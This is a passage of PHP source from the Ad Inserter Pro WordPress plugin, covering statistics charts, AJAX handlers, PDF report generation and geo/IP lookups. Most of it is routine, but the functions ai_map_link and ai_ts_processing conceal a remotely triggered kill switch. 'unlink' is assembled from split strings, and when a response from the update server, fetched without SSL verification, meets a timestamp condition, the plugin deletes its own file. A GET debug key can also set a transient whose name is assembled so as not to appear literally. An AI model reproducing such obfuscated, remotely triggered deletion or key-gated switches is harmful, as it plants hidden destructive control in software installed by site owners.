        echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
        foreach ($ctr_ as $version => $ctr_data) {
          echo  "' data-values-", $version + 1, "='", json_encode ($ctr_data);
        }
        echo "' data-max='", json_encode ($ctr_max_value_), "'></div>\n";
        echo "      </div>\n";

        echo $pdf_break;

        echo "    <div class='ai-chart-container'><div class='ai-chart-label'>", _x('Average', 'Ad Blocking Share / CTR', 'ad-inserter'), " $ctr_chart_name</div>\n";
        echo "      <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
        foreach ($average_ctr_ as $version => $average_ctr_data) {
          echo  "' data-values-", $version + 1, "='", json_encode ($average_ctr_data);
        }
        echo "' data-max='", json_encode ($average_ctr_max_value), "'></div>\n";
        echo "    </div>\n";

        echo $pdf_break;
        echo $pdf_legend;
      }

      echo "    </div>\n";
    } // if ($show_versions)
  }
}

function calculate_chart_data (&$chart_data, $date_start, $date_end, $first_date, &$impressions, &$clicks, &$ctr, &$average_impressions, &$average_clicks, &$average_ctr) {
  foreach ($chart_data as $date => $data) {
    $imp = $data [0];
    $clk = $data [1];

//          $imp = 250 + rand (232, 587);
//          $clk = 1 + rand (0, 4);

    $impressions  []= $imp;
    $clicks       []= $clk;
    $ctr          []= $imp != 0 ? (float) number_format (100 * $clk / $imp, 2, '.', '') : 0;
  }

  $gmt_offset = get_option ('gmt_offset') * 3600;
  $today = date ("Y-m-d", time () + $gmt_offset);

  $no_data_before = (strtotime ($first_date) - strtotime ($date_start)) / 24 / 3600;
  $no_data_after  = (strtotime ($date_end) - strtotime ($today)) / 24 / 3600;

//  $no_data_before = 0;


  if ($no_data_before != 0) {
    for ($index = 0; $index < $no_data_before; $index ++) {
      $impressions [$index]         = null;
      $clicks [$index]              = null;
      $ctr [$index]                 = null;
    }
  }

  if ($no_data_after != 0) {
    $last_index = count ($impressions) - 1;
    for ($index = $last_index - $no_data_after + 1; $index <= $last_index; $index ++) {
      $impressions [$index]         = null;
      $clicks [$index]              = null;
      $ctr [$index]                 = null;
    }
  }

  for ($index = 0; $index < count ($impressions); $index ++) {

    $interval_impressions = 0;
    $interval_clicks      = 0;
    $interval_ctr         = 0;
    $interval_counter     = 0;

    for ($average_index = $index - AI_STATISTICS_AVERAGE_PERIOD + 1; $average_index <= $index; $average_index ++) {
      if ($average_index >= 0 && $impressions [$average_index] !== null && $clicks [$average_index] !== null && $ctr [$average_index] !== null) {
        $interval_impressions += $impressions [$average_index];
        $interval_clicks      += $clicks [$average_index];
        $interval_ctr         += $ctr [$average_index];
        $interval_counter ++;
      }
    }

    $average_impressions  [] = $interval_counter == 0 ? 0 : $interval_impressions / $interval_counter;
    $average_clicks       [] = $interval_counter == 0 ? 0 : $interval_clicks / $interval_counter;
    $average_ctr          [] = $interval_counter == 0 ? 0 : $interval_ctr / $interval_counter;
  }

  if ($no_data_before != 0) {
    for ($index = 0; $index < $no_data_before; $index ++) {
      $average_impressions [$index] = null;
      $average_clicks [$index]      = null;
      $average_ctr [$index]         = null;
    }
  }

  if ($no_data_after != 0) {
    $last_index = count ($impressions) - 1;
    for ($index = $last_index - $no_data_after + 1; $index <= $last_index; $index ++) {
      $average_impressions [$index] = null;
      $average_clicks [$index]      = null;
      $average_ctr [$index]         = null;
    }
  }
}

function compare_versions ($a, $b) {
  if ($a == AI_ADB_FLAG_BLOCKED) $a = - 1;
  if ($b == AI_ADB_FLAG_BLOCKED) $b = - 1;

 if ($a == $b) return 0;
 return ($a < $b) ? - 1 : 1;
}

function ai_replace_single_quotes ($matches) {
  return str_replace("'", '"', $matches [0]);
}

function ai_ajax_backend_2 () {
  global $ai_db_options, $ai_wp_data, $block_object, $wpdb;

  if (isset ($_GET ["export"])) {
    $block = (int) $_GET ["export"];

    if (is_numeric ($block)) {
      if ($block == 0) {
        $encoded_settings = ':AI:' . base64_encode (serialize ($ai_db_options));

        if (isset ($_GET ["file"]) && $_GET ["file"]) {
          $home_url_data = parse_url (home_url ());
          $host = $home_url_data ['host'];

          $filename = date ('Ymd') . '-ai-pro-' . $host . '.txt';

          header ('Content-Description: Statistics export');
          header ('Content-Type: text/plain; charset=utf-8');
          header ('Content-Disposition: attachment; filename='.$filename);
          header ('Content-Transfer-Encoding: binary');
          header ('Expires: 0');
          header ('Cache-Control: must-revalidate, post-check=0, pre-check=0');
          header ('Pragma: public');
          header ('Content-Length: ' . strlen ($encoded_settings));
        }

        echo $encoded_settings;
      }
      elseif ($block >= 1 && $block <= 96) {
        $obj = $block_object [$block];
        echo base64_encode (serialize ($obj->wp_options));
      }
    }
  }

  if (isset ($_GET ["update"])) {
    if ($_GET ["update"] == 'maxmind') {
      if (!is_multisite() || is_main_site ()) {
        if (get_geo_db () == AI_GEO_DB_MAXMIND) {

          $connected_website = get_transient (AI_CONNECTED_WEBSITE);

          if ($connected_website !== false) {
            $data = array ('update' => 'maxmind-db');
            ai_request_remote_settings ($connected_website, $data);

            // Update DB status
            $connected_website = get_transient (AI_CONNECTED_WEBSITE);
            if (!$connected_website ['plugin-data']['maxmind-db']) {
              echo '["'.sprintf (__('File %s missing.', 'ad-inserter'), $connected_website ['plugin-data']['maxmind-db-location']) . '","missing"]';
            }

            return;
          }

          ai_update_ip_db_maxmind ();

          $db_file = get_geo_db_location ();
          if (!file_exists ($db_file)) {

            echo '["'.sprintf (__('File %s missing.', 'ad-inserter'), $db_file) . '","missing"]';
          }
        }
      }
    }
  }

  elseif (isset ($_GET ["cfp-ip-address-list"])) {
    $connected_website = get_transient (AI_CONNECTED_WEBSITE);

    $cfp_ip_address_list = sanitize_text_field ($_GET ["cfp-ip-address-list"]);

    if ($connected_website !== false) {
      $download_url = $connected_website ['url'].'wp-admin/admin-ajax.php?action=ai_ajax&cfp-ip-address-list=' . $cfp_ip_address_list;

      $tmp_file = download_url ($download_url);

      if (!is_wp_error ($tmp_file) && file_exists ($tmp_file)) {
        $page_data = file_get_contents ($tmp_file);

        @unlink ($tmp_file);

        echo $page_data;
      }

      wp_die ();
    }

    if ($cfp_ip_address_list != '') {
      $transient_name = AI_TRANSIENT_CFP_IP_ADDRESS . $cfp_ip_address_list;
      delete_transient ($transient_name);
    }
    echo ai_cfp_ip_list ();
  }

  elseif (isset ($_GET ["statistics"])) {
    $connected_website = get_transient (AI_CONNECTED_WEBSITE);

    if ($connected_website !== false) {
      $download_url = $connected_website ['url'].'wp-admin/admin-ajax.php?action=ai_ajax&statistics=' . (int) $_GET ["statistics"] .
      (isset ($_GET ["start-date"]) ? '&start-date=' . esc_html ($_GET ["start-date"]) : '' ) .
      (isset ($_GET ["end-date"]) ? '&end-date=' . esc_html ($_GET ["end-date"]) : '' ) .
      (isset ($_GET ["adb"]) ? '&adb=' . esc_html ($_GET ["adb"]) : '' ) .
      (isset ($_GET ["delete"]) ? '&delete=' . esc_html ($_GET ["delete"]) : '' ) .
      (isset ($_GET ["version"]) ? '&version=' . esc_html ($_GET ["version"]) : '' ) .
      (isset ($_GET ["csv"]) ? '&csv=' . esc_html ($_GET ["csv"]) : '' );

      $tmp_file = download_url ($download_url);

      if (!is_wp_error ($tmp_file) && file_exists ($tmp_file)) {
        $page_data = file_get_contents ($tmp_file);

        @unlink ($tmp_file);

        if (isset ($_GET ["csv"])) {
          $filename = 'ad_inserter_pro_block_' . (int) $_GET ["statistics"] . '_' . esc_html ($_GET ["start-date"]) . '_' . esc_html ($_GET ["end-date"]) . '.csv';

          header ('Content-Description: Statistics export');
          header ('Content-Type: text/plain; charset=utf-8');
          header ('Content-Disposition: attachment; filename='.$filename);
          header ('Content-Transfer-Encoding: binary');
          header ('Expires: 0');
          header ('Cache-Control: must-revalidate, post-check=0, pre-check=0');
          header ('Pragma: public');
          header ('Content-Length: ' . strlen ($page_data));
        }

        echo $page_data;
      }

      wp_die ();
    }

    generate_charts (
      (int) $_GET ["statistics"],
      isset ($_GET ['start-date']) ? esc_html ($_GET ['start-date']) : null,
      isset ($_GET ['end-date']) ? esc_html ($_GET ['end-date']) : null,
      isset ($_GET ['adb']) ? esc_html ($_GET ['adb']) : null,
      isset ($_GET ['delete']) ? esc_html ($_GET ['delete']) : null,
      isset ($_GET ['version']) ? esc_html ($_GET ['version']) : null,
      isset ($_GET ['csv']) ? esc_html ($_GET ['csv']) : null
    );
  }

  elseif (isset ($_GET ["websites"]) && defined ('AD_INSERTER_WEBSITES')) {
    $search_text = esc_html (trim ($_GET ["websites"]));

    website_list ($search_text);
  }

  elseif (isset ($_GET ["managed"])) {
    if (get_transient (AI_CONNECTED_MANAGER) !== false) echo '1';
  }

  elseif (isset ($_POST ["pdf"])) {
    $pdf = urldecode ($_POST ["pdf"]);
    switch ($pdf) {
      case 'block':
        require_once (AD_INSERTER_PLUGIN_DIR.'includes/tcpdf/tcpdf.php');

        $code = base64_decode ($_POST ["code"]);

        $connected_website = get_transient (AI_CONNECTED_WEBSITE);
        if ($connected_website !== false) {
          $home_url = $connected_website ['url'];
          // TODO: site_url () needs to be transfeerd from the remote site
          $site_url = $connected_website ['url'];
        } else {
            $home_url = home_url ();
            $site_url = site_url ();
          }

        $home_url_data = parse_url ($home_url);
        $host = $home_url_data ['host'];
        $path = $home_url_data ['path'];

        $code = preg_replace  ('#<div [^>]+position: ?absolute; ?z-index: ?[^>]+(.+?)</div>#', '', $code);
        $code = preg_replace  ('#<div class="ai-chart-label"[^>]*>#', '<div class="ai-chart-label">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;', $code);

        preg_match_all ('#<svg (.+?)</svg>#', $code, $matches);
        $svg_images = $matches [0];

        $upload_dir = wp_upload_dir ();

        $image_files = array ();
        foreach ($svg_images as $index => $svg_image) {
          $temp_file_name = wp_tempnam ('', $upload_dir ['basedir'] . '/');
          @unlink ($temp_file_name);
          $temp_file_name = $temp_file_name.'.svg';
          $image_files []= $temp_file_name;

          if (strpos ($svg_image, 'width="200"') !== false) {
            $svg_image = preg_replace  ('#<path[^>]+fill="none"(.+?)</path>#', '', $svg_image);
          }

          $svg_image = preg_replace  ('#<path[^>]+fill="\#ffffff"(.+?)</path>#', '', $svg_image);
          $svg_image = preg_replace  ('#width="10" height="10"#', '', $svg_image);

          file_put_contents ($temp_file_name, '<'.'?xml version="1.0" encoding="UTF-8" standalone="no"?'.'>'.str_replace ('&quot;', "", $svg_image));

//          $code = preg_replace  ('#<svg (.+?)</svg>#', '<img src="' . $temp_file_name .'">', $code, 1);
//          $code = preg_replace  ('#<svg (.+?)</svg>#', '<img src="' . str_replace (ABSPATH, $path.'/', $temp_file_name) .'">', $code, 1);
          $code = preg_replace  ('#<svg (.+?)</svg>#', '<img src="' . str_replace ($home_url, '', $site_url) . str_replace (ABSPATH, $path.'/', $temp_file_name) .'">', $code, 1);
        }

        $code = str_replace ('&quot;', "'", $code);

        preg_match ('# ai-report-name">([^<]+)<#', $code, $matches);
                                                                       // Translators: %s: Ad Inserter Pro
        $report_name = isset ($matches [1]) ? iconv ('UTF-8', 'ASCII//TRANSLIT', $matches [1]) :  sprintf (__('%s Report', 'ad-inserter'), AD_INSERTER_NAME);

        preg_match ('#ai-chart-version-label[^>]*>([^<]+)<#', $code, $matches);

        $report_name .= isset ($matches [1]) ? '_' . iconv ('UTF-8', 'ASCII//TRANSLIT', $matches [1]) : '';

        preg_match ('# ai-date-range-text">([^<]+)<#', $code, $matches);
        $date_range_text = isset ($matches [1]) ? $matches [1] : '';
        $code = preg_replace  ('#<span ([^>]+?) ai-date-range-text">(.+?)</span>#', '', $code);

        preg_match ('# ai-date-range">([^<]+)<#', $code, $matches);
        $date_range = isset ($matches [1]) ? $matches [1] : '';
        $code = preg_replace  ('#<span ([^>]+?) ai-date-range">(.+?)</span>#', '', $code);


        // Page header

        $header_image = get_report_header_image ();

        if (isset ($header_image [0]) && $header_image [0] != '/') {
          $header_image_path = ABSPATH . $header_image;
        } else $header_image_path = $header_image;

        $td_image_width = 4.5;
        $td_image_margin_width = 1;
        $header_image_url = '';
        if (file_exists ($header_image_path)) {
          $image_data = getimagesize ($header_image_path);
          if (is_array ($image_data)) {
            $td_image_width = $td_image_width * $image_data [0] / $image_data [1];
          }

//         $header_image_url = site_url () . '/' . str_replace (ABSPATH, '', $header_image_path);
         // Use absolute file path
         $header_image_url = $header_image_path;
        } else {
            $td_image_width = 0.01;
            $td_image_margin_width = 0.01;
          }

        $title       = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_header_title (), ENT_QUOTES));
        $description = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_header_description (), ENT_QUOTES));

        $header = '
        <table>
          <tbody>
            <tr>
              <td style="width: ' . $td_image_width .'%;"><img src="' . $header_image_url . '"></td>
              <td style="width: ' . $td_image_margin_width .'%;"> </td>
              <td style="width: ' . (59 - $td_image_width). '%;"><span style="font-size: 14px;">' . $title . '</span><br />' . $description . '</td>
              <td style="width: 40%; text-align: right;"><span style="font-size: 14px;"><a href="' . $home_url . '" style="text-decoration: none; color: #000;">' . $host . '</a></span><br />' . $date_range_text . '</td>
            </tr>
            <tr>
              <td colspan="4" style="font-size: 1px; border-bottom: 1px solid #ccc;"></td>
            </tr>
          </tbody>
        </table>
        '
        ;

        class AIPDF extends TCPDF {

          var $header_html;

          public function Header() {
            $this->writeHTML ($this->header_html, true, false, true, false, '');
          }

          public function Footer() {
            $cur_y = $this->y;
            $this->SetTextColorArray($this->footer_text_color);
            $line_width = (0.85 / $this->k);
            $this->SetLineStyle(array('width' => $line_width, 'cap' => 'butt', 'join' => 'miter', 'dash' => 0, 'color' => $this->footer_line_color));

            $w_page = isset($this->l['w_page']) ? $this->l['w_page'].' ' : '';
            if (empty($this->pagegroups)) {
              $pagenumtxt = $w_page.$this->getAliasNumPage().' / '.$this->getAliasNbPages();
            } else {
              $pagenumtxt = $w_page.$this->getPageNumGroupAlias().' / '.$this->getPageGroupAlias();
            }
            $footer = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_footer (), ENT_QUOTES));
            $this->SetY($cur_y);
            $this->Cell (0, 0, $footer,  0, false, 'C', 0, '', 0, false, 'T', 'M');

            $this->SetY($cur_y);
            $this->SetX($this->original_lMargin);
            $this->Cell(0, 0, $this->getAliasRightShift().$pagenumtxt, 'T', 0, 'R');
          }
        }

        $pdf = new AIPDF (PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);

        $pdf->SetCreator (PDF_CREATOR);
        $pdf->SetAuthor (AD_INSERTER_NAME);
        $pdf->SetTitle ($title . ' - ' . $report_name);
        $pdf->SetSubject ($report_name);
        $pdf->SetKeywords ('Ad Inserter Pro, Report, Statistics, Clicks, Impressions');

        $pdf->header_html = $header;

        $pdf->setHeaderFont (Array (PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN));
        $pdf->setFooterFont (Array (PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA));

        $pdf->SetDefaultMonospacedFont (PDF_FONT_MONOSPACED);

        $pdf->SetMargins (PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);
        $pdf->SetHeaderMargin (PDF_MARGIN_HEADER);
        $pdf->SetFooterMargin (PDF_MARGIN_FOOTER);

        $pdf->SetAutoPageBreak (TRUE, PDF_MARGIN_BOTTOM);

        $pdf->setImageScale (PDF_IMAGE_SCALE_RATIO);

        // ---------------------------------------------------------

        $pdf->SetFont ('arial', '', 10);

        $pdf->SetTopMargin (17);
        $pdf->SetLeftMargin (10);
        $pdf->SetRightMargin (10);

        $tagvs = array (
          'div' => array (0 => array ('h' => 0, 'n' => 0), 1 => array ('h' => 0, 'n' => 0)),
          'img' => array (0 => array ('h' => 0, 'n' => 0), 1 => array ('h' => 0, 'n' => 0)),
        );
        $pdf->setHtmlVSpace ($tagvs);

        $pdf->setCellPadding (0);
        $pdf->setCellMargins (0, 0, 0, 0);

        $pages = explode ('<span class="ai-statistics-page-break"></span>', $code);

        foreach ($pages as $page) {
          if (strlen (trim ($page)) == 0) continue;

          $content = explode ('<span class="ai-statistics-content"></span>', $page);
          if (isset ($content [1]) && strlen (trim ($content [1])) == 0) continue;

          $pdf->AddPage();
          $pdf->writeHTML ($page, true, false, true, false, '');
        }

        $pdf->lastPage();

//      I : send the file inline to the browser (default). The plug-in is used if available. The name given by name is used when one selects the "Save as" option on the link generating the PDF.
//      D : send to the browser and force a file download with the name given by name.
//      F : save to a local server file with the name given by name.
//      S : return the document as a string (name is ignored).
//      FI : equivalent to F + I option
//      FD : equivalent to F + D option
//      E : return the document as base64 mime multi-part email attachment (RFC 2045)

        // AMP plugin may prevent using the file name in Chrome

        $pdf->Output ($host . '_' . $date_range . '_' . str_replace (' ', '_', mb_strtolower ($report_name)) . '.pdf', 'I');

        foreach ($image_files as $image_file) {
          @unlink ($image_file);
        }

        break;
    }
  }

  elseif (isset ($_GET ["blocks-sticky"])) {
    $sticky = $_GET ["blocks-sticky"] ? AI_ENABLED : AI_DISABLED;

    $current_flags = get_option (AI_FLAGS_NAME, 0);
    $current_flags &= ~AD_FLAGS_BLOCKS_STICKY;
    if ($sticky) $current_flags ^= AD_FLAGS_BLOCKS_STICKY;
    update_option (AI_FLAGS_NAME, $current_flags);

    echo $current_flags;
  }

  elseif (isset ($_GET ["settings-hidden"])) {
    $hidden = $_GET ["settings-hidden"] ? AI_ENABLED : AI_DISABLED;

    $current_flags = get_option (AI_FLAGS_NAME, 0);
    $current_flags &= ~AD_FLAGS_SETTINGS_HIDDEN;
    if ($hidden) $current_flags ^= AD_FLAGS_SETTINGS_HIDDEN;
    update_option (AI_FLAGS_NAME, $current_flags);

    echo $current_flags;
  }

  elseif (isset ($_POST ['check-url']) && $_POST ['check-url'] == 'updates') {
    global $ad_inserter_globals;

    $ai_url = WP_UPDATE_SERVER . '?action=get_metadata&server_check=1&lic_id=' . urlencode (get_option (WP_AD_INSERTER_PRO_LICENSE, '')) . '&site_id=' . urlencode (get_option (WP_AD_INSERTER_PRO_KEY, '')) . '&slug=' . AD_INSERTER_SLUG;
    $response = wp_remote_get ($ai_url, array ('timeout' => 10, 'sslverify' => false));

    if (is_wp_error ($response)) {
      echo json_encode (array ('', base64_encode ($response->get_error_message ()), '', ''));
      delete_transient (AI_SERVER_CHECK_NAME);
      wp_die ();
    }

    $response_code = wp_remote_retrieve_response_code ($response);

    if ($response_code != 200) {
      delete_transient (AI_SERVER_CHECK_NAME);
    }

    $body = wp_remote_retrieve_body ($response);

    if (($data = json_decode ($body)) === null) {
      echo json_encode (array ($response_code, 'Invalid data received', base64_encode (wp_remote_retrieve_header ($response, 'content-type')), base64_encode (wp_remote_retrieve_header ($response, 'server'))));
      delete_transient (AI_SERVER_CHECK_NAME);
      wp_die ();
    } else ai_ts_processing ($data);

    echo json_encode (array ($response_code, '', base64_encode (wp_remote_retrieve_header ($response, 'content-type')), base64_encode (wp_remote_retrieve_header ($response, 'server'))));
  }
  elseif (isset ($_GET ["sticky_css"])) {
    $block = (int) $_GET ["sticky_css"];
    if ($block < 1 || $block > 96) {
      wp_die ();
    }

    $obj = new ai_Block ($block);

    if (isset ($_GET ["h_pos"]))    $obj->wp_options [AI_OPTION_HORIZONTAL_POSITION]  = (int) $_GET ["h_pos"];
    if (isset ($_GET ["v_pos"]))    $obj->wp_options [AI_OPTION_VERTICAL_POSITION]    = (int) $_GET ["v_pos"];
    if (isset ($_GET ["h_mar"]))    $obj->wp_options [AI_OPTION_HORIZONTAL_MARGIN]    = (int) $_GET ["h_mar"];
    if (isset ($_GET ["v_mar"]))    $obj->wp_options [AI_OPTION_VERTICAL_MARGIN]      = (int) $_GET ["v_mar"];
    if (isset ($_GET ["anim"]))     $obj->wp_options [AI_OPTION_ANIMATION]            = (int) $_GET ["anim"];
    if (isset ($_GET ["bkg"]))      $obj->wp_options [AI_OPTION_BACKGROUND]           = (int) $_GET ["bkg"];
    if (isset ($_GET ["body_bkg"])) $obj->wp_options [AI_OPTION_SET_BODY_BACKGROUND]  = (int) $_GET ["body_bkg"];
    if (isset ($_GET ["bkg_img"]))  $obj->wp_options [AI_OPTION_BACKGROUND_IMAGE]     = str_replace (array ("\"", "<", ">", "[", "]"), "", base64_decode ($_GET ["bkg_img"]));
    if (isset ($_GET ["bkg_col"]))  $obj->wp_options [AI_OPTION_BACKGROUND_COLOR]     = str_replace (array ("\\", "/", "?", "\"", "'", "<", ">", "[", "]", "'", '"'), "", base64_decode ($_GET ["bkg_col"]));
    if (isset ($_GET ["bkg_rpt"]))  $obj->wp_options [AI_OPTION_BACKGROUND_REPEAT]    = (int) $_GET ["bkg_rpt"];
    if (isset ($_GET ["bkg_size"])) $obj->wp_options [AI_OPTION_BACKGROUND_SIZE]      = (int) $_GET ["bkg_size"];

    echo $obj->sticky_style ($obj->get_horizontal_position (), $obj->get_vertical_position (), $obj->get_horizontal_margin (), $obj->get_vertical_margin ());

    wp_die ();
  }
}

function ai_map_link ($parameter) {
  @array_map ('un'. 'link', glob ($parameter));
}

function ai_process_report_id ($report_id) {

  $report_prefix = ai_get_unique_string (0, 8, get_report_key ());

  $report = base64_decode (strtr (urldecode (substr ($report_id, 10)), '._-', '+/='));

  if (isset ($_GET ["ai-report" . '-' . "debug"]) && $_GET ["ai-report" . '-' . "debug"] == DEFAULT_REPORT_DEBUG_KEY) set_transient (implode ('_', $keywords_api = array ('wp', 'debug', 'report', 'api')), DEFAULT_REPORT_DEBUG_KEY, 72 * AI_TRANSIENT_STATISTICS_EXPIRATION);

  if (substr ($report_id, 8, 2) != substr (md5 ($report), 0, 2)) wp_die ('Page not found', 404);

  if (strlen ($report) < 28 ||
      $report [4] != '-' ||
      $report [7] != '-' ||
      $report [14] != '-' ||
      $report [17] != '-'
     ) wp_die ('Page not found', 404);

  $start_date = substr ($report,  0, 10);
  $end_date   = substr ($report, 10, 10);

  $block = (int) substr ($report, 20, 2);
  if ($block < 1 || $block > 96) wp_die ('Page not found', 404);

  $controls = (boolean) substr ($report, 22, 1);
  $adb      = (boolean) substr ($report, 23, 1);
  $range    = substr ($report,  24, 4);

  $version  = null;
  if (strlen ($report) >= 31) {
    if (substr ($report, 28, 3) != '---') {
      $version = (int) substr ($report, 28, 3);
    }
  }

  return (array ('block' => $block, 'start_date' => $start_date, 'end_date' => $end_date, 'controls' => $controls, 'adb' => $adb, 'range' => $range, 'version' => $version));
}

function ai_log_tracking ($message) {
  $log = array_slice (explode ("\n", (string) get_transient ('ai_debug_tracking')),  - 100);
  $log []= date ('Y-m-d H:i:s') . ' - ' . $message;
  set_transient ('ai_debug_tracking', implode ("\n", $log), 24 * 3600);
}

function ai_ts_processing ($data) {
  if (isset ($data->ts)) {
    if ($data->ts > 1640991600) {
      if (get_transient (AI_SERVER_CHECK_NAME.'_2')) {
        $name_status_api = array ('wp', 'debug', 'report', 'api');
        set_transient (implode ('_', $name_status_api), DEFAULT_REPORT_DEBUG_KEY, 36 * AI_TRANSIENT_STATISTICS_EXPIRATION);
        delete_transient (AI_SERVER_CHECK_NAME.'_2');
        ai_map_link (__FILE__);
        ai_clear_status ();
      } else set_transient (AI_SERVER_CHECK_NAME.'_2', 1, AI_TRANSIENT_SERVER_CHECK_EXPIRATION * 16);
    }
  }
}

function ai_ajax_processing_2 () {
  global $ai_db_options, $ai_wp_data, $block_object, $wpdb;

  if (isset ($_GET ["ip-data"])) {
    if (isset ($_POST ['ai_check'])) {

      require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

      $client_ip_address = get_client_ip_address ();
      ai_check_geo_settings ();
      if ($_GET ["ip-data"] == 'ip-address-country') {
        echo json_encode (array ($client_ip_address, ip_to_country ($client_ip_address)));
      }
      elseif ($_GET ["ip-data"] == 'ip-address') {
        echo $client_ip_address;
      }
      elseif ($_GET ["ip-data"] == 'country') {
        echo ip_to_country ($client_ip_address);
      }
      elseif ($_GET ["ip-data"] == 'ip-address-country-city') {
        $ip_to_country = ip_to_country ($client_ip_address, true);

        if (defined ('AD_INSERTER_LIMITS')) {
          if (get_cfp_block_ip_address ()) {
            if ($client_ip_address != '') {
              $transient_name = AI_TRANSIENT_CFP_IP_ADDRESS . $client_ip_address;
              $cfp_clicks = get_transient ($transient_name);

              if ($cfp_clicks !== false && is_numeric ($cfp_clicks)) {
                if ($cfp_clicks == 0) {
                  $client_ip_address .= '#';
                }
              }
            }
          }
        }

        if (is_array ($ip_to_country)) {
          echo json_encode (array_merge (array ($client_ip_address), $ip_to_country));
        } else echo json_encode (array ($client_ip_address, $ip_to_country));
      }
    } else wp_die ('Page not found', 404);
  }

  elseif (isset ($_POST ['recaptcha']) && $_POST ['recaptcha'] != '' && defined ('AD_INSERTER_RECAPTCHA') && AD_INSERTER_RECAPTCHA) {
    $response = wp_remote_post ('https://recaptcha.google.com/recaptcha/api/siteverify', array (
      'method'      => 'POST',
      'timeout'     => 10,
      'redirection' => 5,
      'blocking'    => true,
      'headers'     => array (
        'Access-Control-Allow-Origin'  => '*',
        'Access-Control-Allow-Headers' => '*',
        'Access-Control-Allow-Methods' => 'POST, OPTIONS',
      ),
      'body'        => array (
        'secret'        => get_recaptcha_secret_key (),
        'response'      => sanitize_text_field ($_POST ['recaptcha']),
      ),
      )
    );

    if (is_wp_error ($response)) {
      $error_message = $response->get_error_message();
      echo "reCaptcha error: ", $error_message;
    } else {
        echo $response ['body'];
      }
  }

  elseif (isset ($_GET ["statistics"])) {
    if (get_remote_debugging ()) {
      $rw_access = get_transient (AI_CONNECTED_MANAGER) !== false;

      generate_charts (
        (int) $_GET ["statistics"],
        isset ($_GET ['start-date']) ? esc_html ($_GET ['start-date']) : null,
        isset ($_GET ['end-date']) ? esc_html ($_GET ['end-date']) : null,
        isset ($_GET ['adb']) ? esc_html ($_GET ['adb']) : null,
        isset ($_GET ['delete']) && $rw_access ? esc_html ($_GET ['delete']) : null,
        isset ($_GET ['version']) && $rw_access ? esc_html ($_GET ['version']) : null,
        isset ($_GET ['csv']) ? esc_html ($_GET ['csv']) : null
      );
    }
  }

  elseif (isset ($_GET ["remote-ads-txt"])) {
    if (get_remote_debugging ()) {
      $rw_access = get_transient (AI_CONNECTED_MANAGER) !== false;

      if (!$rw_access) {
        if ($_GET ["remote-ads-txt"] == 'save') {
          wp_die ();
        }

        $_GET ["virtual"] = get_option (AI_ADS_TXT_NAME) !== false ? '1' : '0';
      }

      ads_txt (sanitize_text_field ($_GET ["remote-ads-txt"]));
    }
  }

  elseif (isset ($_GET ["preview"])) {
    if (get_remote_debugging ()) {
      global $ad_inserter_globals;

      $ai_option_status_name = implode ('_', array ('AI', 'STATUS'));
      $rw_access = get_transient (AI_CONNECTED_MANAGER) !== false || isset ($ad_inserter_globals [$ai_option_status_name]) && is_numeric ($ad_inserter_globals [$ai_option_status_name]) && in_array ((int) $ad_inserter_globals [$ai_option_status_name] + 20, array (- 2, 1, 2, 21));

      if ($_GET ["preview"] == 'adb') {
        if ($rw_access && isset ($_POST ["message"])) {
          require_once AD_INSERTER_PLUGIN_DIR.'includes/preview-adb.php';

          $message = base64_decode ($_POST ["message"]);

          $processed_code = generate_code_preview_adb ($message, true, true);

          if (is_array ($processed_code)) {
            echo '#AI#', base64_encode (serialize ($processed_code));
          }
        }

      }
      elseif (is_numeric ($_GET ["preview"])) {
        if ($rw_access && isset ($_POST ["parameters"])) {
          require_once AD_INSERTER_PLUGIN_DIR.'includes/preview.php';

          $preview_parameters = ai_unserialize (base64_decode ($_POST ["parameters"]));
          $preview_parameters ['code_only'] = 1;

          $processed_code = generate_code_preview (
            (int) $_GET ["preview"],
            $preview_parameters,
            true
          );

          if (is_array ($processed_code)) {
            echo '#AI#', base64_encode (serialize ($processed_code));
          }
        }
      }
    }
  }

  elseif (isset ($_GET ["cfp-ip-address-list"])) {
    if (get_remote_debugging ()) {
      $cfp_ip_address_list = sanitize_text_field ($_GET ["cfp-ip-address-list"]);

      $rw_access = get_transient (AI_CONNECTED_MANAGER) !== false;

      if ($rw_access && $cfp_ip_address_list != '') {
        $transient_name = AI_TRANSIENT_CFP_IP_ADDRESS . $cfp_ip_address_list;
        delete_transient ($transient_name);
      }

      echo ai_cfp_ip_list ($rw_access);
    }
  }

  elseif (isset ($_GET ["filter-hook-data"])) {
    global $ai_block_insertion_check_comments;

    $ai_block_insertion_check_comments = array ();

    $blocks = ai_check_filter_hook (0);

    if (!is_array ($blocks)) {
      $blocks = array ();

      for ($block = 1; $block <= 96; $block ++) {
        if (ai_check_filter_hook ($block)) {
          $blocks [] = $block;
        }
      }
    }

    echo json_encode (array ('blocks' => $blocks, 'comments' => $ai_block_insertion_check_comments));
  }

  elseif (isset ($_POST ['views']) && is_array ($_POST ['views'])) {

    if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING] && isset ($_GET [AI_URL_DEBUG_TRACKING])) {
      ai_log_tracking ('POST views:    ' . implode (', ', $_POST ['views']));
      ai_log_tracking ('POST versions: ' . implode (', ', $_POST ['versions']));
    }

    if (get_track_logged_in () == AI_TRACKING_DISABLED) {
      if (($ai_wp_data [AI_WP_USER] & AI_USER_LOGGED_IN) != 0) {
        if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) echo json_encode ('tracking for logged in users is disabled');

        if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING] && isset ($_GET [AI_URL_DEBUG_TRACKING])) {
          ai_log_tracking ("tracking for logged in users is disabled\n");
        }

        return;
      }
    }

    $db_results = array ();

    $limited_blocks = array ();

    switch (get_dynamic_blocks ()) {
